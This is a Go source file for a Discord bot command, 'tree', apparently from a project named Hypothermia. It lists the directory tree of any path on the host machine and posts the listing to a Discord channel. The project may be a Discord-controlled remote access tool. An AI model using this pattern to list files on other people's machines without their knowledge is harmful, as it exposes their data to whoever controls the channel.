package commands

import (
	"fmt"
	"strconv"

	"Hypothermia/src/utils"
	"github.com/bwmarrin/discordgo"
)

const (
	treeUsage string = "[path] [depth?]"

	treeArgsError string = "🟥 Expected 1 or more arguments."
	treeGenError  string = "🟥 Error in generating tree: "
)

func (*TreeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, treeArgsError+"\nUsage: "+treeUsage, m.Reference())
		return
	}

	var depth int = 2
	var treeStr string

	if len(args) > 1 {
		num, err := strconv.Atoi(args[1])
		if err != nil {
			depth = 2
		} else {
			depth = num
		}
	}

	err := utils.GenerateTree(args[0], depth, 0, "", &treeStr)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(treeGenError+"%s", err), m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, treeStr, m.Reference())
}

func (*TreeCommand) Name() string {
	return "tree"
}

func (*TreeCommand) Info() string {
	return "shows a tree of files in a directory"
}

type TreeCommand struct{}
